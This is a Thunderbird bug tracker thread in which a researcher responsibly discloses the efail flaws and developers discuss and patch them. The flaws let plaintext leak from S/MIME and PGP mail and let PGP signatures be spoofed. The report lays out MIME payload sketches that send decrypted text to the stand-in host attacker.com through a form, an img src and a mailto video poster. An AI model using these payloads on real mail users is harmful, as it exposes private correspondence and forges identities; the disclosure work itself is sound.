| [OpenPGP Signature Spoofing (Screenshot)](/attachment.cgi?id=8979996)  [7 years ago](#c201)  [Jens Müller](/user_profile?user_id=588172)   42.35 KB, image/png |  | [Details](/attachment.cgi?id=8979996&action=edit) |
| [S/MIME Reply Exfiltration](/attachment.cgi?id=8979997)  [7 years ago](#c202)  [Jens Müller](/user_profile?user_id=588172)   1.37 KB, message/rfc822 |  | [Details](/attachment.cgi?id=8979997&action=edit) |
| [S/MIME Reply Exfiltration (Screenshot)](/attachment.cgi?id=8979998)  [7 years ago](#c203)  [Jens Müller](/user_profile?user_id=588172)   60.26 KB, image/png |  | [Details](/attachment.cgi?id=8979998&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1419417#c0)• 7 years ago |
|  | |

Attached file
[Decryption oracle PoC 1: Leaking plaintext through reply/forward](attachment.cgi?id=8930484)
— [Details](attachment.cgi?id=8930484&action=edit)

User Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Build ID: 20170929010941
Steps to reproduce:
In the scope of academic research within the efail project, in cooperation with Ruhr-University Bochum and FH Münster, Germany we discovered various security issues in Thunderbird: An attacker who is in possession of S/MIME or PGP encrypted messages can embed them into specially crafted HTML mails and re-send them to the intended receiver. When the message is read and decrypted by the receiver, the plaintext is leaked to an attacker-controlled server. Furthermore, this issue allows an attacker to spoof PGP signatures. The root cause for these vulnerabilities lies in the way Thunderbird handles multipart messages. The general cause is present since Thunderbird version 0.1, released in 2003.
All issues are present in the current Thunderbird version 52.4.0 (if not stated otherwise).
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* General Cause: Multipart messages are rendered as a single HTML document \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Thunderbird internally uses HTML to display emails. If a message consists of multiple parts, all parts are put into a single HTML document, separated by a <br>, <fieldset> and <div> tag::
<html>
<head></head>
<body>
<BR><FIELDSET CLASS="mimeAttachmentHeader"></FIELDSET><BR/>
<div class="moz-text-html" lang="x-western">\*part-01\*</div>
<BR><FIELDSET CLASS="mimeAttachmentHeader"></FIELDSET><BR/>
<div class="moz-text-html" lang="x-western">\*part-02\*</div>
etc.
</body>
</html>
This is dangerous to be used in combination with cryptography, because it allows an attacker to wrap encrypted or signed content into her own HTML/CSS code:
multipart/mixed
|--- Content-Type: text/html
| [arbitrary HTML or CSS]
|--- [enc or signed messages]
+--- Content-Type: text/html
[arbitrary HTML or CSS]
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* Issue A: Leaking encrypted mails \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
/Attacker model/: Attacker is in possession of S/MIME or PGP/MIME encrypted messages, which she may have obtained as passive man-in-the-middle or by actively hacking into the victim's mail server or gateway
/Attacker's goal/: Leak the plaintext by wrapping the ciphertext into an HTML mail sent to and decrypted by the victim
-------------------------------------------------------------
\*Proof of concept 1: Leaking plaintext through reply/forward\*
-------------------------------------------------------------
Prerequisites:
- victim reads and composes messages in HTML
- victim replies or forwards the message
Attack:
The attacker can hide the encrypted part, for example, in an iframe:
multipart/mixed
|--- Content-Type: text/html
| Please answer to this email
| <iframe width="1" height="1" frameborder="0">
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
</iframe>
The encrypted part is decrypted as soon as the victim reads the mail. If the victim replies to or forwards the mail, the decrypted plaintext will be sent, hidden in the invisible iframe and without the victim noticing. Note that this variant of the attack only works if message bodys are viewed as original HTML (default) \*and\* the user checked `compose messages in HTML format' (non default). Also note that hundreds of collected S/MIME or PGP/MIME ciphertexts can be embedded in the multipart mail and all the plaintexts leaked with one single reply.
----------------------------------------------------------
\*Proof of concept 2: Leaking plaintext through HTML forms\*
----------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim submits an HTML form by clicking on an area in the message
Attack:
Another variant of the attack, which works since Thunderbird 3.0 is using HTML forms to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <form action="<https://attacker.com/leak>" method="post">
| <button type="submit">
| <textarea
|--- Content-Type: multipart/encrypted
+--- Content-Type: application/pkcs7-mime
Again, the plaintext for hundreds of collected S/MIME or PGP/MIME ciphertexts could be leaked by a single form submission. The user still has to actively submit the form, but with CSS it is possible to make the form being submitted if the user clicks \*somewhere\* into the (harmless) message shown to him which may even security-aware users. Other variants may include setting up fake scrollbars or Thunderbird warnings that submit the form if clicked.
-------------------------------------------------------------
\*Proof of concept 3: Leaking plaintext through src attribute\*
-------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
- victim allows remote content (further attack variants possible, see below)
Attack:
Another variant of this attack is to use the HTML src attribute, for example, for invisible iframes or image tags to leak the plaintext:
multipart/mixed
|--- Content-Type: text/html
| <img src='<https://attacker.com/>
|--- Content-Type: multipart/encrypted
|--- Content-Type: application/pkcs7-mime
+--- Content-Type: text/html
'>
After decryption, the plaintext is urlencoded and sent as HTTP GET request to the attacker if the user allows remote content to be loaded. To encourage this, there are various options:
- The attacker may spoof the mail address to a `trusted' source which the victim already has whitelisted (for example, some company which requires remote image for their mails being readable)
- The attacker may sent a fake newsletter/spam mail and leak the plaintext by tempting the victim to click on a `Click here to unsubscribe' link
- From Thunderbird 12.0 to 52.0.1, remote content had automatically been loaded if a news:// uri schemes was used in the HTML src attribute which could be used to leak the plaintext to a NNTP server
- In the current version (52.4.0), Thunderbird can be tricked into thinking a mail is an RSS feed if the mail begins with certain headers:
From - Fri Nov 17 20:13:09 2017
X-Mozilla-Status2: 00000040
Note that this seems to work only for local (Movemail) message setups, not if the mail is fetched via IMAP or POP3
- In the current version (52.4.0), mailto links can be used to force an HTML context (even if the user has set messages to be neither viewed nor composed in HTML format). While most html tags seem to be filtered, <video poster="url"> gets through and automatically triggers a connection:
mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E">
Note however, that this can probably not be used to leak plaintext because we have not found a way to define multipart messages to be included in mailto: links
- There may be other bypasses for remote content blocking like <link preconnect="..."> which we reported in October ([bug 1408867](/show_bug.cgi?id=1408867 "RESOLVED FIXED - Privacy Issue: preconnect bypasses remote content block"))
Note that again multiple S/MIME and PGP/MIME messages can be leaked in a single mail that is read and decrypted. There seems to be an upper limited of 1024kB for the length of HTTP GET requests sent by Thunderbird, but an attacker can include multiple HTML tags with src attributes in case the messages should exceed this limit.
Find attached three emails which leak S/MIME and PGP/MIME encrypted messages to localhost:8080. For a proof of concept, you need to replace the encrypted parts with S/MIME or PGP/MIME messages you have the private key for, obviously.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* Issue B: Signature Spoofing Attacks \*\*\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
/Attacker model/: Attacker is in possession of a valid OpenPGP signature from the entity to be impersonated, which she may have obtained from email correspondence, public mailing lists, signed software packages, signed GitHub commits, etc; this should be a realistic scenario, so we don't even need an NSA-like attacker
/Attacker's goal/: Given her own text, the attacker wants to spoof a correct signature to be displayed by Enigmail
There are various ways to achieve this goal. CSS can be used to hide the signed part (for example, by setting the font size or color). Furthermore, the signed part can be embedded by and therefore hidden in HTML tags.
Note that this attack does not seem to work for S/MIME because Thunderbird's S/MIME implementation only shows a valid signature if the whole message (including all parts) is correctly signed.
-------------------------------------------------------------------
\*Proof of concept 1: Signature spoofing with CSS and plaintext tag\*
-------------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
Attack:
The signed part can be hidden by setting the font color to the default background color (white). Furthermore, the <plaintext> tag can be used to get rid of the border being displayed:
multipart/mixed
|--- Content-Type: text/html
| [Arbitrary text inserted by the attacker]
| <div style="color:white"><plaintext>
+--- Content-Type: multipart/signed
[PGP signed part]
------------------------------------------------------------------
\*Proof of concept 2: Signature spoofing with invisible iframe tag\*
------------------------------------------------------------------
Prerequisites:
- victim reads messages in HTML
Attack:
The signed part can be hidden in an invisible iframe:
multipart/mixed
|--- Content-Type: text/html
| [Arbitrary text inserted by the attacker]
| <iframe width="1" height="1" frameborder="0"
+--- Content-Type: multipart/signed
[PGP signed part]
Find attached two emails which are displayed as correctly signed by Phil Zimmermann in Thunderbird/Enigmail while the attacker can completely alter the actual text that is shown to the user.

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1419417#c1)• 7 years ago |
|  | |

Attached file
[Decryption oracle PoC 2: Leaking plaintext through HTML forms](attachment.cgi?id=8930485)
— [Details](attachment.cgi?id=8930485&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1419417#c2)• 7 years ago |
|  | |

Attached file
[Decryption oracle PoC 3: Leaking plaintext through src attribute](attachment.cgi?id=8930486)
— [Details](attachment.cgi?id=8930486&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1419417#c3)• 7 years ago |
|  | |

Attached file
[Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag](attachment.cgi?id=8930487)
— [Details](attachment.cgi?id=8930487&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1419417#c4)• 7 years ago |
|  | |

Attached file
[Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag](attachment.cgi?id=8930488)
— [Details](attachment.cgi?id=8930488&action=edit)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a639_588172)• 7 years ago |

[Attachment #8930484](/attachment.cgi?id=8930484&action=edit "Decryption oracle PoC 1: Leaking plaintext through reply/forward") -
Attachment description: 01-dec-pgp-smime-html-reply.eml → Decryption oracle PoC 1: Leaking plaintext through reply/forward
[Attachment #8930484](/attachment.cgi?id=8930484&action=edit "Decryption oracle PoC 1: Leaking plaintext through reply/forward") -
Attachment filename: 01-dec-pgp-smime-html-reply.eml → A1-dec-pgp-smime-html-reply.eml

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a644_588172)• 7 years ago |

[Attachment #8930485](/attachment.cgi?id=8930485&action=edit "Decryption oracle PoC 2: Leaking plaintext through HTML forms") -
Attachment description: 02-dec-pgp-smime-html-form.eml → Decryption oracle PoC 2: Leaking plaintext through HTML forms
[Attachment #8930485](/attachment.cgi?id=8930485&action=edit "Decryption oracle PoC 2: Leaking plaintext through HTML forms") -
Attachment filename: 02-dec-pgp-smime-html-form.eml → A2-dec-pgp-smime-html-form.eml

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a649_588172)• 7 years ago |

[Attachment #8930486](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute") -
Attachment description: 03-dec-pgp-smime-html-src.eml → Decryption oracle PoC 3: Leaking plaintext through src attribute
[Attachment #8930486](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute") -
Attachment filename: 03-dec-pgp-smime-html-src.eml → A3-dec-pgp-smime-html-src.eml

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a653_588172)• 7 years ago |

[Attachment #8930487](/attachment.cgi?id=8930487&action=edit "Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag") -
Attachment description: 04-sig-pgp-css-and-plaintext.eml → Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag
[Attachment #8930487](/attachment.cgi?id=8930487&action=edit "Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag") -
Attachment filename: 04-sig-pgp-css-and-plaintext.eml → B1-sig-pgp-css-and-plaintext.eml

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a658_588172)• 7 years ago |

[Attachment #8930488](/attachment.cgi?id=8930488&action=edit "Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag") -
Attachment description: 05-sig-pgp-invisible-iframe.eml → Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag
[Attachment #8930488](/attachment.cgi?id=8930488&action=edit "Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag") -
Attachment filename: 05-sig-pgp-invisible-iframe.eml → B2-sig-pgp-invisible-iframe.eml

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a91991_1689)• 7 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a200020_101158)• 7 years ago |

See Also: → [efail](/show_bug.cgi?id=1420217 "RESOLVED DUPLICATE - [efail] Full Plaintext Leak in PGP")

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1419417#c5)• 7 years ago |
|  | |

CCing some additional Thunderbird folks, hoping this will get their attention.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1419417#c6)• 7 years ago |
|  | |

Jörg, can you take this? Let me know if we can be of any help.Assignee: nobody → jorgkFlags: needinfo?(jorgk)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1419417#c7)• 7 years ago |
|  | |

See [bug 1240290 comment #54](/show_bug.cgi?id=1240290#c54 "RESOLVED FIXED - Susceptibility to S/MIME Message Takeover Attacks").Flags: needinfo?(jorgk)

|  | [Philipp Kewisch [:Fallen][📱📆]](/user_profile?user_id=253233) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1419417#c8)• 7 years ago |
|  | |

Joshua promised to take a look at this after work. Thanks Joshua <3Assignee: jorgk → Pidgeot18Flags: needinfo?(Pidgeot18)

|  | [Joshua Cranmer [:jcranmer]](/user_profile?user_id=286107) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1419417#c9)• 7 years ago |
|  | |

Some comments:
(In reply to Jens Müller from [comment #0](/show_bug.cgi?id=1419417#c0 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
> \*\*\* Issue A: Leaking encrypted mails \*\*\*
> \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
The effective cause of the problem is that libmime produces a single HTML page by concatenating all of the parts together. This means that the HTML sections can already bleed together (and there are definitely bugs on this that I'm not going to try to find right now). The easy way to fix this would be to put every every document in a separate <iframe>, but we would need [bug 80713](/show_bug.cgi?id=80713 "NEW - Need a way to specify an auto-height (size) for an IFRAME such that the frame is given the full height of the contained content (moz-seamless, part of seamless iframes)") to avoid the fixed height issue, and that bug's been on nobody's radar for years. Maybe the fact that there's a security bug in not doing so could light a fire, but I wouldn't hold out high hopes.
> ----------------------------------------------------------
> \*Proof of concept 2: Leaking plaintext through HTML forms\*
> ----------------------------------------------------------
We actually support submitting forms? o\_O
My memory isn't entirely wrong: judging from [bug 533545 comment 76](/show_bug.cgi?id=533545#c76 "RESOLVED WONTFIX - Form submission from HTML mail is completely broken (action = get)"), supporting form submission in HTML email is not an intended feature. It was broken at some point, but apparently we never fully ripped out the breakage.
> - In the current version (52.4.0), Thunderbird can be tricked into thinking
> a mail is an RSS feed if the mail begins with certain headers:
> From - Fri Nov 17 20:13:09 2017
> X-Mozilla-Status2: 00000040
> Note that this seems to work only for local (Movemail) message setups, not
> if the mail is fetched via IMAP or POP3
In practice, someone who can inject mail into Movemail is already doing arbitrary file I/O on your machine, which means you've already basically lost the security game.
We do have checks to ignore X-Mozilla-\* headers if it comes from elsewhere, but I think we reused the mbox code to handle movemail.
> Note that this attack does not seem to work for S/MIME because Thunderbird's
> S/MIME implementation only shows a valid signature if the whole message
> (including all parts) is correctly signed.
Yes, S/MIME does have a check such that if the encrypted piece isn't the top-level of the message, it ignores the security status information. This is actually baked in the frontend; the backend library blindly passes everything along with a nesting depth, but the frontend drops everything that's not top-level. It sounds like Enigmail isn't doing the same logic, or just setting the nesting depth unconditionally to 1, which needs to be brought up with the Enigmail folks.Flags: needinfo?(Pidgeot18)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1419417#c10)• 7 years ago |
|  | |

Update from our side: We would like to go full-disclosure in mid April in the scope of an academic paper (covering a whole bunch of email security issues). We think it's a very serious issue: with a single tiny bit of user interaction (or maybe without if the attacker somehow manages to bypass remote content blocking) -- the encrypted mails of years can be leaked.
One workaround would be to not render HTML content in encrypted mails (Enigmail does this already for PGP/INLINE) or consequently block remote content (not give the user an option!), forms etc. for encrypted content and not to allow users to click on links etc. In respect to [bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED"), this seems to be necessary anyway.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a7961455_176914)• 7 years ago |

[Attachment #8930484](/attachment.cgi?id=8930484&action=edit "Decryption oracle PoC 1: Leaking plaintext through reply/forward") -
Attachment mime type: message/rfc822 → text/plain

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1419417#c11)• 7 years ago |
|  | |

(In reply to Joshua Cranmer [:jcranmer] from [comment #9](/show_bug.cgi?id=1419417#c9 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> The easy way to fix this would
> be to put every document in a separate <iframe>,
This was last attempted in [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering") (now a duplicate of ancient [bug 31052](/show_bug.cgi?id=31052 "NEW - Display attachments inline: Contents & formatting of attached HTML file (background/CSS styles/position:absolute/dir=\"rtl\"...) leak into main HTML part or vice versa (wrong bgcolor/images/unclosed tags...: unreadable; multipart/mime, iframe,send web page)")) to avoid bleeding of CSS ...
> but we would need [bug 80713](/show_bug.cgi?id=80713 "NEW - Need a way to specify an auto-height (size) for an IFRAME such that the frame is given the full height of the contained content (moz-seamless, part of seamless iframes)") to avoid the fixed height issue, ...
... without even knowing about that issue.

|  | [Philipp Kewisch [:Fallen][📱📆]](/user_profile?user_id=253233) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1419417#c12)• 7 years ago |
|  | |

(In reply to Joshua Cranmer [:jcranmer] from [comment #9](/show_bug.cgi?id=1419417#c9 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Yes, S/MIME does have a check such that if the encrypted piece isn't the
> top-level of the message, it ignores the security status information. This
> is actually baked in the frontend; the backend library blindly passes
> everything along with a nesting depth, but the frontend drops everything
> that's not top-level. It sounds like Enigmail isn't doing the same logic, or
> just setting the nesting depth unconditionally to 1, which needs to be
> brought up with the Enigmail folks.
Patrick, is this maybe already fixed in Enigmail 2.0? Anything you could do to secure things on your side?Flags: needinfo?(patrick)

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1419417#c13)• 7 years ago |
|  | |

I fixed these issues in Enigmail 1.9.9 already (without announcing it).
The only exception is Encryption PoC 2 -- I cannot see how I could fix this in Enigmail.Flags: needinfo?(patrick)

|  | [Philipp Kewisch [:Fallen][📱📆]](/user_profile?user_id=253233) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1419417#c14)• 7 years ago |
|  | |

Nice, that sounds great! So this means all we'd need to do to fix the bug is to disable form submissions? That seems simple enough. Magnus, do you have cycles to look at this in the next week?Flags: needinfo?(mkmelin+mozilla)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a11166728_101158)• 7 years ago |

Depends on: [CVE-2018-5185](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too")

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1419417#c15)• 7 years ago |
|  | |

Looked at the form submission issue, fixing it in [bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too").
I did not verify, but I don't think the other issues regarding decryption reported in this bug are fixed.
Patrick, did you only mean the "Issue B: Signature Spoofing Attacks" are fixed. Or how is the "Issue A: Leaking encrypted mails" problem resolved?Flags: needinfo?(mkmelin+mozilla) → needinfo?(patrick)

|  | [Patrick Brunschwig](/user_profile?user_id=100230) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1419417#c16)• 7 years ago |
|  | |

Issue B is fixed in Enigmail, that's a pure UI thing.
Issue A is fixed as far as I can:
- PoC 1 is "fixed" in Enigmail by displaying a warning to the user if a "suspicious" type of PGP/MIME (or inline-PGP) structure is detected.
- PoC 2 and PoC 3: AFAICT this cannot be addressed by EnigmailFlags: needinfo?(patrick)

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1419417#c17)• 7 years ago |
|  | |

To recapitulate:
+--------------------------------------------------------------------------------+
| | S/MIME | OpenPGP |
|----------------+--------------------------------+------------------------------|
| Issue A, PoC 1 | fixed? (dec only if top-level) | mitigated in Enigmail 1.9.9 |
| Issue A, PoC 2 | fixed in [Bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too") (TB 60) | fixed in [Bug 1450345](/show_bug.cgi?id=1450345 "RESOLVED FIXED - prevent form submission for <button> too") (TB 60) |
| Issue A, PoC 3 | fixed? (dec only if top-level) | |
|----------------+--------------------------------+------------------------------|
| Issue B, PoC 1 | not vulnerable | fixed in Enigmail 1.9.9 |
| Issue B, PoC 2 | not vulnerable | fixed in Enigmail 1.9.9 |
+--------------------------------------------------------------------------------+
S/MIME, Issue A, PoC 1/3 -- Question to @jcranmer:
--------------------------------------------------
Since when is it fixed? Just asking because TB 52.6 still allows partly S/MIME encrypted mails, it just does not allow partly S/MIME signed mails (therefore Issue B, PoC 1/2 is not vulnerable for S/MIME). Such a fix would mean that emails with e.g. only the attachment encrypted will no longer be decrypted, correct?
OpenPGP, Issue A, PoC 3 -- Possible workarounds:
--------------------------------------------------
- separate DOM for each HTML body part (best fix, but hardest to implement)
- same fix(?) as for S/MIME (drawback: partly encrypted mails will no longer be decrypted)
- do not give user an option to load remote content in encrypted mails (just a workaround!)
Last question: will a CVE be assigned to this with the fixing TB release?Flags: needinfo?(Pidgeot18)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1419417#c18)• 7 years ago |
|  | |

Maybe we can close this bug.
It \*looks\* like this is being dealt with and discussed in [bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED").

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1419417#c19)• 7 years ago |
|  | |

Unfortunately this bug has several parts, so many are fixed but not all. We still need to fix "Decryption oracle PoC 1: Leaking plaintext through reply/forward" AFAICT.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1419417#c20)• 7 years ago |
|  | |

[Bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED") only fixed issues related to external content. The issue of message parts interacting is still open, see [bug 1411592 comment #11](/show_bug.cgi?id=1411592#c11 "RESOLVED FIXED") and above, and [comment #11](/show_bug.cgi?id=1419417#c11 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") here. I haven't made any progress in [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering").

|  | [Jens Müller](/user_profile?user_id=588172)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1419417#c21)• 7 years ago |
|  | |

Note:
- Issue A, PoC 1 (leak plaintext via reply/forward) still works in
TB-nightly for S/MIME encrypted messages (mitigated in Enigmail)
- Issue A, PoC 3 (leak plaintext via remote content) still works in
TB-nightly for S/MIME encrypted messages (and for PGP too I guess)
This has \*not\* been fixed by [bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED"). The problem for Issue A, PoC 3 is that remote content \*within\* encrypted messages is disabled now ([bug 1411592](/show_bug.cgi?id=1411592 "RESOLVED FIXED")), but in \*this\* bug ("direct exfiltration") we wrap the encrypted MIME part and prepend <img src="<http://attacker.com/> in a previous MIME part in the same email -- where remote content still seems to be allowed. TB puts all together in a single HTML document to be rendered.
All those plaintext leaks (Issue A, Poc \*) are based on the problem that multiple MIME parts are put into the same DOM. This can probably not be changed fast. But what about the following quick fix: Do not decrypt S/MIME and OpenPGP encrypted messages if they are not top-level (within in the MIME tree). This breaks partly encrypted messages but they should not happen often in practice (e.g. only-encrypt-the-attachment).

|  | [Joshua Cranmer [:jcranmer]](/user_profile?user_id=286107) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1419417#c22)• 7 years ago |
|  | |

(In reply to Jens Müller from [comment #17](/show_bug.cgi?id=1419417#c17 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> S/MIME, Issue A, PoC 1/3 -- Question to @jcranmer:
> --------------------------------------------------
> Since when is it fixed? Just asking because TB 52.6 still allows partly
> S/MIME encrypted mails, it just does not allow partly S/MIME signed mails
> (therefore Issue B, PoC 1/2 is not vulnerable for S/MIME). Such a fix would
> mean that emails with e.g. only the attachment encrypted will no longer be
> decrypted, correct?
We don't indicate that partly S/MIME mail is anything different from regular email. While the user could still see the decrypted email, there would be no indication that the email was encrypted in the first place unless the user desired to view source (or wondered why the message couldn't be found when searching message bodies).
> Last question: will a CVE be assigned to this with the fixing TB release?
I play no role in that process.Flags: needinfo?(Pidgeot18)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a13670866_101158)• 7 years ago |

Depends on: [CVE-2018-5162](/show_bug.cgi?id=1457721 "RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute")

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a13834619_176914)• 7 years ago |

[Attachment #8930486](/attachment.cgi?id=8930486&action=edit "Decryption oracle PoC 3: Leaking plaintext through src attribute") -
Attachment mime type: message/rfc822 → text/plain

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1419417#c23)• 7 years ago |
|  | |

Attached patch

[bug1419417\_efail\_reply\_fwd.patch](attachment.cgi?id=8973795&action=diff) (obsolete)
— [Details](attachment.cgi?id=8973795&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795)

Fix PoC 1 by only forwarding/replying to encrypted messages as plaintext.
That is not the neatest fix, but at least it's safe.
This should be the last of the attack vectors.
We can try to think of a better fix but time is running up.
What we could do is parse each part separately into a document, then insert each element after one another. But libmime is so much magic that it's really hard to follow where to put the logic.Assignee: Pidgeot18 → mkmelin+mozillaStatus: UNCONFIRMED → ASSIGNEDEver confirmed: true
[Attachment #8973795](/attachment.cgi?id=8973795&action=edit "bug1419417_efail_reply_fwd.patch") -
Flags: review?(jorgk)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1419417#c24)• 7 years ago |
|  | |

